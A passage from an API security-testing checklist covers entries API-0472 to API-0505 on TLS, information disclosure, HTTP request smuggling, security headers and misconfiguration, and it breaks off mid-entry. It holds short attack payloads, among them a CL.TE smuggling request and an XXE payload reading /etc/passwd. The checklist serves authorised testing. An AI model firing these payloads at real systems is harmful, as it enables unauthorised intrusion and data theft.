**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Check if API stores sensitive data encrypted<br>2. Trigger SQL injection to dump raw stored data<br>3. Verify encryption keys separate from data

**Expected Result:** Sensitive fields encrypted at rest; passwords hashed with bcrypt/argon2

**Payload / PoC Example:**

```
SQLi dump: SELECT * FROM users → passwords in MD5, SSNs in plaintext
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** sqlmap

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0472 — Weak TLS Configuration
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Scan TLS configuration<br><br>2. Check for weak ciphers<br><br>3. Test for SSLv3/TLS 1.0/1.1<br><br>4. Verify certificate validity

**Expected Result:** Should use TLS 1.2+ with strong ciphers

**Payload / PoC Example:**

```
testssl.sh or sslyze scan
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** testssl.sh

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0473 — Missing Certificate Validation
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Set up MITM proxy<br><br>2. Use self-signed certificate<br><br>3. Intercept API traffic<br><br>4. Check if client validates certificate

**Expected Result:** Should validate certificates strictly

**Payload / PoC Example:**

```
API client accepts invalid certificate
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** mitmproxy

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0474 — Weak Password Hashing
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Review password storage mechanism<br><br>2. Check hashing algorithm<br><br>3. Verify salt usage<br><br>4. Test for rainbow table vulnerability

**Expected Result:** Should use bcrypt/scrypt/argon2 with salt

**Payload / PoC Example:**

```
MD5 or SHA1 password hashes
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0475 — Predictable Random Values
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Collect multiple tokens/IDs<br><br>2. Analyze for patterns<br><br>3. Predict future values<br><br>4. Forge tokens or access resources

**Expected Result:** Should use CSPRNG for security values

**Payload / PoC Example:**

```
Sequential or predictable tokens
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Burp Sequencer

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0476 — Sensitive Data in URL
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Check URLs for sensitive data<br><br>2. Look for tokens in query strings<br><br>3. Check referrer leakage<br><br>4. Review browser history exposure

**Expected Result:** Should send sensitive data in headers or body

**Payload / PoC Example:**

```
/api/resource?token=abc123
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Manual

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0477 — Verbose error / stack trace leak
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GET Error responses / verbose output / metadata

**Test Steps:** 1. Trigger errors with malformed input<br>2. Inspect for stack trace / file paths / SQL schema / hostnames

**Expected Result:** Generic error messages in production

**Payload / PoC Example:**

```
Stack with /var/www/app/db.yml
```

**Impact:** Aids exploitation; PII

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0478 — API Versioning Information Leak
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Check headers and responses<br>2. Identify exact version<br>3. Search for known vulnerabilities

**Expected Result:** Should minimize version exposure

**Payload / PoC Example:**

```
X-API-Version: 1.2.3-beta (vulnerable version)
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0479 — Server Information Disclosure
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Check Server header<br>2. Trigger errors to identify stack<br>3. Find version info

**Expected Result:** Should remove/obscure server information

**Payload / PoC Example:**

```
Server: Apache/2.4.49 (vulnerable version)
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0480 — Verbose Error Messages
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Trigger various errors<br>2. Check for stack traces<br>3. Look for sensitive info

**Expected Result:** Should return generic error messages

**Payload / PoC Example:**

```
Stack traces with file paths and DB info
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0481 — GraphQL Suggestion/Auto-Completion Leakage
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Send invalid field names<br>2. Check error messages<br>3. Identify valid fields from suggestions

**Expected Result:** Should disable suggestions in production

**Payload / PoC Example:**

```
Did you mean 'secretField'?
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** GraphQL Cop

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0482 — PII Exposure in API Error Responses
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Trigger errors on user endpoints<br>2. Check error messages for PII (email, name, SSN)<br>3. Collect across different error types (404, 400, 500)

**Expected Result:** Error messages use generic codes; no PII in error details

**Payload / PoC Example:**

```
GET /api/users/999 → {"error":"User not found","email":"victim@target.com","id":999}
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0483 — Sensitive Data in API Response Headers
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Inspect all response headers<br>2. Check for tokens, internal IPs, stack info in headers<br>3. Look for X-Debug, X-Backend-Server, X-Internal-Token

**Expected Result:** Response headers contain only necessary information; no internal data

**Payload / PoC Example:**

```
Response: X-Backend-Server: internal-db-01
X-Debug-Token: abc123
X-Powered-By: PHP/7.2.0
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Burp Suite, curl -I

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0484 — API Logs Contain Sensitive Data
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Trigger various API flows with sensitive params<br>2. Access log endpoints (/logs, /actuator/logfile)<br>3. Verify logs don't contain passwords/tokens/PII

**Expected Result:** Logs redact sensitive fields; no credentials or PII logged in plaintext

**Payload / PoC Example:**

```
POST /api/login?password=secret123 → URL logged with password
GET /api/users?ssn=123-45-6789 → SSN in access log
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Log analysis, Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0485 — Third-Party API Data Exposure via Proxy
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Map all third-party API calls made by server<br>2. Check if user PII forwarded unnecessarily<br>3. Verify data minimization in third-party calls

**Expected Result:** Only minimal necessary data shared with third parties; PII not forwarded without consent

**Payload / PoC Example:**

```
Server sends full user profile to analytics: {ssn, dob, email, location}
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Burp Suite, MITM proxy

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API3:2023 Broken Object Property Level Authorization

---

## API-0486 — GraphQL Field Suggestion Leakage
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Send query with typo in field name<br><br>2. Check error message for suggestions<br><br>3. Enumerate valid field names<br><br>4. Discover hidden fields

**Expected Result:** Should disable field suggestions in production

**Payload / PoC Example:**

```
{user{passwor}} - suggests 'password'
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API9:2023 Improper Inventory Management

---

## API-0487 — Sensitive Data in Cache
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Access sensitive endpoint<br><br>2. Check cache headers<br><br>3. Access cached response from CDN/proxy<br><br>4. Retrieve other users' data

**Expected Result:** Should disable caching for sensitive data

**Payload / PoC Example:**

```
Cache-Control header missing on /api/profile
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Burp Suite

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API8:2023 Security Misconfiguration

---

## API-0488 — Sensitive Data in Logs
**Phase:** 12-Misconfig · **Category:** Information Disclosure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / metadata

**Test Steps:** 1. Trigger various API requests<br><br>2. Access or request log files<br><br>3. Search for passwords tokens PII<br><br>4. Extract sensitive information

**Expected Result:** Should never log sensitive data

**Payload / PoC Example:**

```
Password or token visible in logs
```

**Impact:** Sensitive data/verbose errors leaked to attacker

**Tools:** Manual

**References:** -&gt;[Recon checklist](#/checklist/recon); Jason Haddix 'Bug Hunter's Methodology'; ProjectDiscovery toolchain; OWASP Amass; API8:2023 Security Misconfiguration

---

## API-0489 — HTTP request smuggling
**Phase:** 12-Misconfig · **Category:** Request Smuggling · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Front-end/back-end request boundary (CL/TE)

**Test Steps:** 1. smuggler.py -u https://target.com<br>2. Confirm CL.TE / TE.CL via two-request poisoning<br>3. Demonstrate hijack of next user

**Expected Result:** Normalize CL/TE; reject ambiguous

**Payload / PoC Example:**

```
Content-Length+Transfer-Encoding ambiguous
```

**Impact:** Auth bypass / cache poison

**Tools:** smuggler.py,Burp HTTP Smuggler

**References:** -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0490 — HTTP Request Smuggling (CL.TE)
**Phase:** 12-Misconfig · **Category:** Request Smuggling · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Front-end/back-end request boundary (CL/TE)

**Test Steps:** 1. Send POST with both Content-Length and Transfer-Encoding<br>2. Craft CL.TE desync payload<br>3. Poison backend queue to access other users' requests

**Expected Result:** Server normalizes ambiguous requests; single parser used

**Payload / PoC Example:**

```
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 6

0

G
```

**Impact:** HTTP desync; request hijacking &amp; cache poisoning

**Tools:** Burp Suite HTTP Smuggler, smuggler.py

**References:** -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0491 — HTTP/2 Downgrade Request Smuggling
**Phase:** 12-Misconfig · **Category:** Request Smuggling · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Front-end/back-end request boundary (CL/TE)

**Test Steps:** 1. Use HTTP/2 with front-end proxy downgrading to HTTP/1.1<br>2. Inject HTTP/1.1 headers in HTTP/2 frames<br>3. Smuggle requests to backend via header injection

**Expected Result:** H2 to H1 translation handled safely; no header injection possible

**Payload / PoC Example:**

```
HTTP/2 frame with injected Transfer-Encoding: chunked header
```

**Impact:** HTTP desync; request hijacking &amp; cache poisoning

**Tools:** Burp Suite HTTP2 Smuggler

**References:** -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks (PortSwigger Research); PortSwigger Academy; API8:2023 Security Misconfiguration

---

## API-0492 — HTTP request smuggling on API gateway / CDN
**Phase:** 12-Misconfig · **Category:** Request Smuggling · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Front-end gateway/CDN &lt;-&gt; back-end API boundary (CL.TE / TE.CL / H2 downgrade)

**Test Steps:** 1. Send timing-probe desync payloads to the API edge (safe detection first)<br>2. Confirm a CL.TE/TE.CL/H2.CL discrepancy<br>3. Smuggle a prefix to hijack the next request / poison shared cache<br>4. Demonstrate auth-header capture or cache poisoning (bounded, reversible)

**Expected Result:** Edge and origin agree on message length; HTTP/2 not ambiguously downgraded

**Payload / PoC Example:**

```
H2.CL / CL.TE probe via Burp HTTP Request Smuggler / Turbo Intruder; smuggled prefix: GET /admin ...
```

**Impact:** Gateway desync -&gt; request hijacking, credential capture, cache poisoning

**Tools:** Burp Suite (HTTP Request Smuggler), Turbo Intruder

**References:** -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks (PortSwigger Research); OWASP API8; API8:2023 Security Misconfiguration

---

## API-0493 — Missing security headers
**Phase:** 12-Misconfig · **Category:** Security Headers · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** GET Security response headers (CSP/HSTS/X-Frame)

**Test Steps:** 1. curl -I https://api.target.com/<br>2. Check HSTS CSP X-Content-Type-Options Referrer-Policy Permissions-Policy<br>3. For auth: Cache-Control: no-store

**Expected Result:** All headers correctly set

**Payload / PoC Example:**

```
Missing: HSTS CSP nosniff
```

**Impact:** Defense-in-depth gap

**Tools:** curl,Burp

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0494 — Clickjacking via Missing X-Frame-Options
**Phase:** 12-Misconfig · **Category:** Security Headers · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Security response headers (CSP/HSTS/X-Frame)

**Test Steps:** 1. Check X-Frame-Options header<br><br>2. Create iframe embedding target page<br><br>3. Overlay with malicious UI<br><br>4. Trick user into clicking

**Expected Result:** Should set X-Frame-Options: DENY or SAMEORIGIN

**Payload / PoC Example:**

```
API response embedded in attacker iframe
```

**Impact:** Missing hardening headers weakens defense-in-depth

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0495 — MIME Sniffing Attack
**Phase:** 12-Misconfig · **Category:** Security Headers · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Security response headers (CSP/HSTS/X-Frame)

**Test Steps:** 1. Check X-Content-Type-Options header<br><br>2. Upload file with wrong content-type<br><br>3. Check if browser sniffs content<br><br>4. Achieve XSS via MIME confusion

**Expected Result:** Should set X-Content-Type-Options: nosniff

**Payload / PoC Example:**

```
Missing nosniff allows MIME sniffing
```

**Impact:** Missing hardening headers weakens defense-in-depth

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0496 — Missing HSTS Header
**Phase:** 12-Misconfig · **Category:** Security Headers · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Security response headers (CSP/HSTS/X-Frame)

**Test Steps:** 1. Check Strict-Transport-Security header<br><br>2. Attempt SSL stripping attack<br><br>3. Check if HTTPS enforced<br><br>4. Intercept downgraded connection

**Expected Result:** Should set HSTS with appropriate max-age

**Payload / PoC Example:**

```
Missing or weak HSTS header
```

**Impact:** Missing hardening headers weakens defense-in-depth

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0497 — Debug / actuator endpoints exposed
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Server config / response headers / defaults

**Test Steps:** 1. Probe /actuator/* /.env /debug /console /metrics /api/_debug /swagger-ui /api-docs<br>2. Check for stack traces with verbose=1

**Expected Result:** Disable in production

**Payload / PoC Example:**

```
GET /actuator/env
```

**Impact:** Internal data + RCE in some cases

**Tools:** DirBuster,nuclei

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0498 — No HTTPS Enforcement
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Access API via HTTP<br>2. Check if redirects to HTTPS<br>3. Test HSTS headers

**Expected Result:** Should enforce HTTPS only and set HSTS

**Payload / PoC Example:**

```
http://api.example.com works
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0499 — No Input Length Validation
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Send extremely long strings<br>2. Test 10MB+ JSON payloads<br>3. Check server handling

**Expected Result:** Should enforce reasonable length limits

**Payload / PoC Example:**

```
username: 'A' * 1000000
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0500 — No API Request Size Limit
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Send 100MB+ request body<br>2. Monitor server resources<br>3. Test DoS potential

**Expected Result:** Should enforce request size limits (1-10MB)

**Payload / PoC Example:**

```
POST with 500MB JSON payload
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Custom Script

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API4:2023 Unrestricted Resource Consumption

---

## API-0501 — API Doesn't Validate Content-Type
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Send JSON with Content-Type: text/plain<br>2. Test various content types<br>3. Check processing

**Expected Result:** Should validate Content-Type matches body

**Payload / PoC Example:**

```
Content-Type: image/jpeg with JSON body
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0502 — API Gateway Bypass
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Access backend API directly<br>2. Bypass gateway protections<br>3. Test direct backend URLs

**Expected Result:** Should only expose API via gateway

**Payload / PoC Example:**

```
Direct access to backend bypasses auth
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Manual

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0503 — DNS Rebinding Attack on API
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Set up domain that resolves to public IP then internal IP<br>2. Trick browser-based API calls to rebind to internal<br>3. Bypass CORS/SOP via DNS rebinding

**Expected Result:** API validates Host header strictly; DNS rebinding mitigated

**Payload / PoC Example:**

```
DNS TTL=1, first resolve: 1.2.3.4 (public), second: 192.168.1.1 (internal)
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** singularity, DNSrebinder

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0504 — Content-Type Confusion - JSON to XML Switch
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Change Content-Type: application/xml<br>2. Send XML with XXE payload in body<br>3. Check if server parses as XML

**Expected Result:** Server validates Content-Type matches expected format; rejects unexpected types

**Payload / PoC Example:**

```
POST /api/user
Content-Type: application/xml
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>
```

**Impact:** Misconfiguration exposes data or weakens security controls

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0505 — API Endpoint HTTP Verb Tampering
**Phase:** 12-Misconfig · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Enumerate all endpoints<br>2. Test each with every HTTP method<br>3. Identify methods that bypass auth or bypass business rules

**Expected Result:** Each endpoint strictly allows only necessary methods; 405 returned otherwise

**Payload / PoC Example:**

```
